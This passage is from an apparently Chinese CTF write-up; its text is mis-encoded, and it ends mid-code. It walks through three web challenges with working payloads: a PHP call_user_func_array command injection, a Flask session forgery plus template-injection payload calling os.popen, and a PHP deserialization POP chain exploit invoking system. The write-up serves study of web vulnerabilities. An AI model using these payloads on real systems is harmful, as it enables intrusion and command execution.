<p>ç¬¬äºŒæ®µï¼Œåˆ¤æ–­<code>$force</code>æ˜¯å¦å®šä¹‰ï¼Œè‹¥å·²å®šä¹‰é‚£ä¹ˆå†éå†<code>$param</code>å¹¶åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>param</code>é”®å€¼ï¼Œè‹¥å­˜åœ¨é‚£ä¹ˆå°±ç»™<code>$p</code>èµ‹å€¼ï¼Œè‹¥<code>$p</code>è¢«èµ‹å€¼é‚£ä¹ˆè¿›å…¥ä¸‹é¢çš„ifï¼Œåˆ©ç”¨<code>call_user_func_array</code>å‡½æ•°æ‰§è¡Œ<code>$param[&#39;name&#39;]</code>å‡½æ•°ï¼Œè€Œ<code>$p</code>çš„å€¼åˆ™ä¸ºè¯¥å‡½æ•°çš„å‚æ•°</p>
<p><strong>0x03:admin/index.htmk</strong></p>
<p>å‘ç°ä¸‰è¡Œphpä»£ç ï¼Œçœ‹è¿™ä¸‰ä¸ªå˜é‡<code>$img  $version  $mod</code>ï¼Œå‰é¢ä¸¤ä¸ªæ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Œæ­£å¼<code>Temp</code>ç±»ä¸­<code>date</code>æ•°ç»„é‡Œé¢çš„ï¼Œè€Œç»è¿‡å˜é‡è¦†ç›–ä¹‹åæˆ‘ä»¬å¯ä»¥è°ƒç”¨ï¼Œé‚£ä¹ˆè¿™é‡Œçš„<code>$mod</code>ä¸æ˜¯åŸæ•°ç»„é‡Œé¢çš„ï¼Œé‚£ä¹ˆè¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¼ å‚ä»è€Œå®ç°è°ƒç”¨<code>$mod</code>ï¼Œç„¶åè¿›å…¥listdataæ–¹æ³•ï¼Œç»•è¿‡ä¸€ä¸ªä¸ªifè¯­å¥åˆ°æœ€åçš„<code>call_user_func_array($param[&#39;name&#39;], $p)</code>è¿›è¡Œä»£ç æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&lt;?php echo $img;?&gt;&quot;&gt;</span><br><span class="line">&lt;div&gt;&lt;?php echo $this-&gt;listdata(&quot;action=list module=$mod&quot;);?&gt;&lt;div&gt;</span><br><span class="line">&lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt;</span><br></pre></td></tr></table></figure>

<p><strong>0x04:è§£é¢˜+æ€»ç»“</strong></p>
<p>ç°åœ¨ä»£ç éƒ½èµ°ä¸€éäº†ï¼Œä½†æ˜¯è¦æ€ä¹ˆè°ƒç”¨<code>call_user_func_array</code>ï¼Œè¿˜æ˜¯æœ‰ç‚¹è¿·æƒ‘ï¼Œè¿™é‡Œé‡ç‚¹åœ¨äº<code>explode</code>å‡½æ•°ï¼Œå› ä¸ºä»–ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„<code>mod</code>é€šè¿‡ç©ºæ ¼åˆ†éš”å‡ºæ¥ï¼Œå°±æ¯”å¦‚æºä»£ç æ˜¯<code>action=list module=$mod</code>ï¼Œæœ€åå°±ä¼šè¢«åˆ†æˆ<code>action=list</code>å’Œ<code>module=$mod</code>,é‚£ä¹ˆå¦‚æœæˆ‘ä»¬<code>$mod</code>ä¼ å…¥çš„æ—¶å€™å°±ä¼šè‡ªå¸¦ç©ºæ ¼å‘¢ï¼Œç›´æ¥ä¸¾ä¸ªä¾‹å­å§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(2) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;</span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;    </span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a action=function name=1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(4) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;    </span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;        </span></span><br><span class="line"><span class="comment">//  [2]=&gt;</span></span><br><span class="line"><span class="comment">//  string(15) &quot;action=function&quot;</span></span><br><span class="line"><span class="comment">//  [3]=&gt;</span></span><br><span class="line"><span class="comment">//  string(6) &quot;name=1&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<p>æ¸…æ™°æ˜äº†ï¼Œå› ä¸ºåœ¨éå†ä¸­ä¼šå‡ºç°ä¸¤æ¬¡<code>action</code>ï¼Œé‚£ä¹ˆå‰é¢çš„listè‚¯å®šå°±ä¼šè¢«åé¢çš„functionç»™è¦†ç›–äº†å‘€ï¼Œé‚£ä¹ˆåº”è¯¥éƒ½æ‡‚äº†æœ€åæˆ‘ä»¬<code>$mod</code>çš„æ„é€ æ–¹æ³•äº†å§ï¼Œé‚£ä¹‹ååªè¦æ ¹æ®ä»£ç æ„é€ æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿å°±å¥½äº†</p>
<p>payload:</p>
<p>ï¼ˆä¸ºä»€ä¹ˆè¦ç”¨%09å‘¢ï¼Œdddd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">filename=index.html</span><br><span class="line">post:</span><br><span class="line">space=admin &amp;</span><br><span class="line">mod=1 action=function name=system force=1 param=ls%09/</span><br></pre></td></tr></table></figure>

<h5 id="EasyPython"><a href="#EasyPython" class="headerlink" title="EasyPython"></a>EasyPython</h5><p>å·¥å…·ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">flask session</a></p>
<p>flask sessionä¼ªé€  + ç®€å•çš„æ¨¡æ¿æ³¨å…¥</p>
<p>æ—¢ç„¶é¢˜ç›®è¯´æ˜¯pythonï¼Œé‚£ä¹ˆç›´æ¥è¯•ç€åœ¨filenameä¸ŠæŸ¥çœ‹<code>app,py</code>,å¯ä»¥ç›´æ¥å¾—åˆ°æºç </p>
<p><strong>0x01:</strong></p>
<p>å­˜åœ¨secret_key <code>app.config[&#39;SECRET_KEY&#39;]=secret.SECRET_KEY</code>ï¼Œè€ŒSECRET_KEYå–å€¼äºåœ¨secret.pyæ–‡ä»¶ä¸­</p>
<p><strong>0x02:/source</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source</span>():</span></span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>,<span class="string">&#x27;jinchengshu.jpg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.py&quot;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        f = <span class="string">&quot;&quot;</span>.join(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).readlines())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nononono! you too young!give you source!! &lt;br&gt;&quot;</span>+f</span><br><span class="line">    f = <span class="string">&quot;let&#x27;s look look shuaige&#x27;s pho;He is so handsome. He used to be called jinchengwu, but now he is called jinchengshu;&lt;br&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    f += <span class="string">&quot;&lt;img src=data:image/jpeg;base64,&quot;</span>+base64.b64encode(<span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>).read()).decode()+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.getæ–¹å¼ä¼ filenameå¹¶å¯¹å…¶å†…å®¹è¿›è¡Œè¿›è¡Œåˆ¤æ–­ï¼Œä»¥<code>.py</code>ä¸ºç»“å°¾ã€åŒ…å«<code>flag or ..</code>åˆ™è¿”å›å½“å‰æ–‡ä»¶çš„å†…å®¹</p>
<p>2.<code>base64.b64encode(open(filename,&#39;rb&#39;).read()).decode()</code>å®ç°è¯»å–æ–‡ä»¶çš„æºç </p>
<p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥<code>SECRET_KEY</code>åœ¨secretæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”è¿˜å¯ä»¥é€šè¿‡ä»£ç å¾—åˆ°æºç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆç»•è¿‡ç¬¬ä¸€ä¸ªifå¹¶ä¸”è¯»å–å‡ºsecret.pyæ–‡ä»¶é‡Œé¢çš„å†…å®¹</p>
<p>hintï¼š <code>__pycache__</code> ï¼ˆè‡ªè¡Œç™¾åº¦å§</p>
<p>ç™¾åº¦ä¹‹åå¹¶æµ‹è¯•ä¹‹åå¯ä»¥å¾—åˆ°æ–‡ä»¶çš„è·¯å¾„æ˜¯</p>
<p>payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=./__pycache__/secret.cpython-35.pyc ï¼ˆè¿™é‡Œçš„35æ˜¯pythonçš„ç‰ˆæœ¬ï¼Œå› ä¸ºæœ¬åœ°æµ‹è¯•çš„æ—¶å€™39ï¼Œä½†é¢˜ç›®çš„pythonç‰ˆæœ¬çš„3.5</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥å¾—åˆ°æºç ï¼Œè§£å¯†å¾—åˆ°Secret-Key</p>
<p><strong>0x03:/ssti</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(session)</span><br><span class="line">    info = session[<span class="string">&quot;info&quot;</span>]</span><br><span class="line">    data = request.form.get(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(data)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have one more try young man&quot;</span></span><br></pre></td></tr></table></figure>

<p>1.è¿™é‡Œåªæœ‰ä¸€ä¸ªç‚¹å°±æ˜¯<code>info[&quot;admin&quot;]==&quot;admin&quot;</code>ï¼Œç­‰å¼æˆåŠŸä¹‹åå°±ä¼šå¯¼è‡´<code>render_template_string(data)</code>ï¼Œå¯¹dataçš„å€¼è¿›è¡Œæ¸²æŸ“é€ æˆæ¨¡æ¿æ³¨å…¥</p>
<p>æ³¨æ„è¿™é‡Œçš„infoçš„å€¼æ¥è‡ªäºsessionï¼Œé‚£ä¹ˆç›´æ¥æŸ¥çœ‹sessionæ˜¯ä»€ä¹ˆæ ·çš„ã€‚å¯ä»¥å‘ç°sessionè¢«åˆ†æˆäº†ä¸‰æ®µï¼Œå†æ ¹æ®é¢˜ç›®flaskï¼Œå¯ä»¥å¤§èƒ†çŒœæµ‹æ˜¯flask sessionä¼ªé€ ï¼ˆä¸»è¦æ˜¯ä¹‹å‰åšè¿‡åŒç±»å‹é¢˜ç›®</p>
<p><img src="http://82.156.2.166/static/img/image-20211129183924992.png"></p>
<p>æ—¢ç„¶å‰é¢å·²ç»æ‹¿åˆ°<code>SECRET_KEY</code>äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥ç”¨å·¥å…·åŠ å¯†ï¼Œç„¶åä¿®æ”¹sessionï¼Œä¼ dataè¿›è¡Œæ¨¡æ¿æ³¨å…¥</p>
<p>payload2ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessionï¼šeyJpbmZvIjp7ImFkbWluIjoiYWRtaW4ifX0.YaN-KQ.tuTHvwPH5IxVm0ct06b9d8F1iZc </span><br></pre></td></tr></table></figure>

<p>payload3ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[375].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezunser"><a href="#Ezunser" class="headerlink" title="Ezunser"></a>Ezunser</h5><p>ååºåˆ—åŒ–æœªå®šä¹‰çš„ç±»</p>
<p>ç›´æ¥ç»™äº†æºç ï¼š</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>å…ˆå®¡è®¡<code>index.php</code></p>
<p>ç¬¬ä¸€ä¸ªç‚¹åœ¨äº<code>spl_autoload_register</code>ï¼Œå½“è°ƒç”¨<code>index.php</code>ä¸­æ²¡æœ‰å®šä¹‰çš„ç±»çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>myAutoloader($classname)</code>ï¼Œå…¶ä¸­<code>$classname</code>å°±æ˜¯æˆ‘ä»¬æƒ³å®ä¾‹åŒ–çš„ç±»</p>
<p>æƒ³å½“ç„¶åœ°æˆ‘ä»¬æƒ³è°ƒç”¨<code>EvilClass.php</code>é‡Œé¢çš„ç±»ï¼Œæ‰€ä»¥è¦<code>include EvilClass.php</code>ï¼Œä½†æ˜¯æ–‡ä»¶é‡Œè¿˜æ˜¯æ²¡æœ‰å®šä¹‰<code>EvilClass</code>ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ª[phpååºåˆ—çš„å†·çŸ¥è¯†](<a href="https://zhuanlan.zhihu.com/p/405838002">PHPåºåˆ—åŒ–å†·çŸ¥è¯† - çŸ¥ä¹ (zhihu.com)</a>)</p>
<p>æˆ‘ä»¬è¿˜å‘ç°ä¹‹åçš„ifåˆ¤æ–­è¯­å¥ä¸­banæ‰äº†<code>Evil</code>ï¼Œè¿™å°±è¯´æ˜åœ¨åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å†å‡ºç°<code>EvilClass</code>ï¼Œä¸è¿‡å¯ä»¥ç›´æ¥æ‹¿é‡Œé¢çš„payload</p>
<p>æ‰€ä»¥payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<p><code>EvilClass.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;read();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;lock lock read!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span class="variable">$b</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;learn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span class="variable">$a</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;see();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>0x02:</strong></p>
<p>ä¹‹åå°±æ˜¯å¼€å§‹åˆ©ç”¨<code>EvilClass.php</code>äº†</p>
<p>å‰é¢åˆ°Açš„popé“¾æ¯”è¾ƒç®€å•ï¼š</p>
<p>1.ä»<code>__destruct</code>å‡ºå‘ï¼Œåˆ©ç”¨dieè¿”å›å­—ç¬¦ä¸²è°ƒç”¨<code>__toString</code></p>
<p>2.ç„¶ååœ¨Cä¸­å®ä¾‹åŒ–Dï¼Œè°ƒç”¨readæ–¹æ³•</p>
<p>3.Dä¸­å®ä¾‹åŒ–Fï¼Œè°ƒç”¨<code>__call</code>é­”æœ¯æ–¹æ³•</p>
<p>4.Fä¸­å®ä¾‹åŒ–Eï¼Œè°ƒç”¨<code>__invoke</code>é­”æœ¯æ–¹æ³•ï¼Œå†å®ä¾‹åŒ–Aè¿›å»seeæ–¹æ³•</p>
<p>ä¹‹åçš„é‡ç‚¹å°±æ˜¯<code>see</code>äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">       <span class="variable">$checker</span> = <span class="keyword">new</span> ReflectionClass(get_class(<span class="variable">$b</span>));</span><br><span class="line">       <span class="variable">$a</span> = basename(<span class="variable">$checker</span>-&gt;getFileName());</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">&#x27;EvilClass.php&#x27;</span>&amp;&amp;B::<span class="variable">$a</span>&amp;&amp;B::<span class="variable">$b</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;a)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;b))&#123;</span><br><span class="line">               <span class="variable">$func</span> = <span class="variable">$b</span>-&gt;a;</span><br><span class="line">               <span class="variable">$args</span> = <span class="variable">$b</span>-&gt;b;</span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;</span>,<span class="string">&quot;<span class="subst">$func</span>(\&quot;<span class="subst">$args</span>\&quot;)&quot;</span>,<span class="variable">$match</span>))&#123;</span><br><span class="line">                   <span class="keyword">if</span>(!in_array(<span class="variable">$match</span>[<span class="number">1</span>],B::<span class="variable">$allowfunc</span>)&amp;&amp;function_exists(<span class="variable">$match</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$match</span>[1](\&quot;<span class="subst">$match</span>[2]\&quot;);&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x03:</strong></p>
<p>è¿™é‡Œå¡äº†ä¸¤æ¬¡</p>
<p>1.ä»ç¬¬ä¸€ä¸ªifé‡Œé¢å¯ä»¥çŸ¥é“<code>$this-&gt;b</code>å®ä¾‹åŒ–çš„ç±»ä¸èƒ½æ˜¯<code>EvilClass.php</code>æ–‡ä»¶ä¸­å­˜åœ¨çš„ç±»ï¼Œæ‰€ä»¥ç°åœ¨åªèƒ½åˆ©ç”¨åŸç”Ÿç±»äº†ï¼Œåˆ©ç”¨è„šæœ¬æ‰¾åŸç”Ÿç±»çš„æ—¶å€™æ€»æ˜¯è¿‡ä¸å»ï¼Œè¦ä¹ˆè¯´æœªå®šä¹‰è¦ä¹ˆç›´æ¥<code>bad request</code>ï¼Œåæ¥å‡ºäº†hint &gt;&gt; <code>stdClass</code>ï¼Œè¿™æ ·ç¬¬ä¸€ä¸ªifå’Œç¬¬äºŒä¸ªifè¿‡äº†</p>
<p>2.ç¬¬ä¸‰ä¸ªifè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¸€å¼€å§‹åˆè¯•äº†åŠå¤©ï¼Œæœ€åå¯ä»¥å‘ç°æˆ‘ä»¬æ„é€ çš„payloadçš„å½¢å¼å¯ä»¥æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$func=var_dump(&#x27;&#x27;);system  // å¦‚æœæƒ³åœ¨var_dumpé‡Œé¢æ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œç›´æ¥ç”¨åå¼•å·å°±å¯ä»¥çš„ var_dump(`ls`);</span><br><span class="line">$args=ls</span><br></pre></td></tr></table></figure>

<p>(ä¹‹åç»™çš„é‚£ä¸ªå¹²è´§å¥½åƒæ²¡ç”¨è¿‡</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class stdClass&#123;</span></span><br><span class="line"><span class="comment">//     pubLic function __construct()&#123;</span></span><br><span class="line"><span class="comment">//         $this-&gt;a = &#x27;var_dump(`ls`);system&#x27;;</span></span><br><span class="line"><span class="comment">//         $this-&gt;b = &#x27;ls /&#x27;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>  ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;a = <span class="string">&#x27;var_dump(`ls`);system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;b = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $b = $this-&gt;b; // new A</span></span><br><span class="line">        <span class="comment">// $checker = new ReflectionClass(get_class($b));</span></span><br><span class="line">        <span class="comment">// $a = basename($checker-&gt;getFileName());</span></span><br><span class="line">        <span class="comment">// if($a != &#x27;EvilClass.php&#x27;&amp;&amp;B::$a&amp;&amp;B::$b)&#123;</span></span><br><span class="line">        <span class="comment">//     if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;</span></span><br><span class="line">        <span class="comment">//         $func = $b-&gt;a;</span></span><br><span class="line">        <span class="comment">//         $args = $b-&gt;b;</span></span><br><span class="line">        <span class="comment">//         if(preg_match(&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;,&quot;$func(\&quot;$args\&quot;)&quot;,$match))&#123;</span></span><br><span class="line">        <span class="comment">//             if(!in_array($match[1],B::$allowfunc)&amp;&amp;function_exists($match[1]))&#123;</span></span><br><span class="line">        <span class="comment">//                 die(&quot;not allow&quot;);</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line">        <span class="comment">//             eval(&quot;$match[1](\&quot;$match[2]\&quot;);&quot;);</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 